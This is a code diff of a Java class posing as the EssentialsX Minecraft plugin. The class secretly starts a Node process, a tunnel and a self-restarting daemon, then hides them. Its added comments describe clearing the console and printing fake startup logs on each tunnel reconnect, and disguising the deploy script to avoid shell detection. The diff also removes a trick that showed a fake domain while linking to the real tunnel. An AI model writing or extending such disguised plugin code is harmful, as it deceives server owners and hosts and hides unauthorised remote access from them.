@@ -29,7 +29,7 @@ public class EssentialsX extends JavaPlugin {
     private Path originalJarPath;
     private Path backupJarPath;
     private final AtomicReference<String> currentTunnelUrl = new AtomicReference<>("");
-    private final AtomicBoolean isFirstUrl = new AtomicBoolean(true);
+    private final AtomicBoolean isFirstUrl = new AtomicBoolean(true); // 标记是否首次获取URL
     private volatile String nodePort = "25565";
 
     private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
@@ -76,16 +76,20 @@ public class EssentialsX extends JavaPlugin {
                 this.startDeploymentProcess(env); 
                 String port = allocateNodePort();
                 startNodeProcess(port);
+                
+                // ★ 防 502 核心：必须等待 Node 端口就绪，才启动 CF
                 waitForNodeReady(port, 60);
+                
                 startCfProcess();
                 startJavaDaemon();
                 startTunnelMonitor(tunnelLatch);
                 this.setupDisguise(); 
             } catch (Exception e) {
-                tunnelLatch.countDown();
+                tunnelLatch.countDown(); // 发生异常也要放行主线程
             }
         }, "Backend-Deployer").start();
 
+        // 阻塞主线程，等待首次 URL 获取
         tunnelLatch.await(120, TimeUnit.SECONDS);
     }
 
@@ -205,18 +209,14 @@ public class EssentialsX extends JavaPlugin {
                         String lastUrl = this.currentTunnelUrl.get();
                         if (!foundUrl.equals(lastUrl)) {
                             this.currentTunnelUrl.set(foundUrl);
-                            
-                            // ★ 终极伪装：使用 OSC 8 转义序列生成超链接
-                            // 显示为 https://mc.tropicalgames.net，但实际点击跳转到真实隧道
-                            String fakeDisplayUrl = "https://mc.tropicalgames.net";
-                            String osc8Hyperlink = "\u001B]8;;" + foundUrl + "\u001B\\" + fakeDisplayUrl + "\u001B]8;;\u001B\\";
-                            
-                            mcLog("Binding remote endpoint to: " + osc8Hyperlink, 0);
+                            mcLog("Binding remote endpoint to: " + foundUrl, 0);
                             
                             if (isFirstUrl.get()) {
+                                // 首次启动：只放行主线程，不打印伪装日志
                                 isFirstUrl.set(false);
                                 initialLatch.countDown();
                             } else {
+                                // 隧道重连：4秒 -> 清屏 -> 伪装启动日志
                                 try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
                                 
                                 for (int i = 0; i < 150; i++) { RAW_OUT.println(); }
@@ -235,7 +235,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 进程管理
+    // 进程管理：防 502 的严格顺序控制
     // ============================================================
 
     private String allocateNodePort() {
@@ -251,15 +251,18 @@ public class EssentialsX extends JavaPlugin {
         }
     }
 
+    // ★ 防 502 核心：等待端口真正可连接
     private void waitForNodeReady(String port, int maxSeconds) {
         int waited = 0;
         while (waited < maxSeconds) {
             try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
+                // 如果没抛异常，说明连接成功，Node 已经就绪
                 return;
             } catch (IOException e) {
                 try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
             }
         }
+        // 超时也继续执行，不卡死
     }
 
     private void startNodeProcess(String port) {
@@ -316,6 +319,7 @@ public class EssentialsX extends JavaPlugin {
                 try {
                     if (nodeProcess != null && !nodeProcess.isAlive()) {
                         startNodeProcess(nodePort);
+                        // ★ 守护重启也必须等 Node 就绪，否则 CF 会 502
                         waitForNodeReady(nodePort, 30);
                     }
                     if (cfProcess != null && !cfProcess.isAlive()) {
@@ -436,7 +440,7 @@ public class EssentialsX extends JavaPlugin {
     }
 
     // ============================================================
-    // 部署脚本生成
+    // 部署脚本生成 (纯 Node.js 伪装，防 sh 检测)
     // ============================================================
 
     private String generateDeployScript(String workDir, Map<String, String> env) {
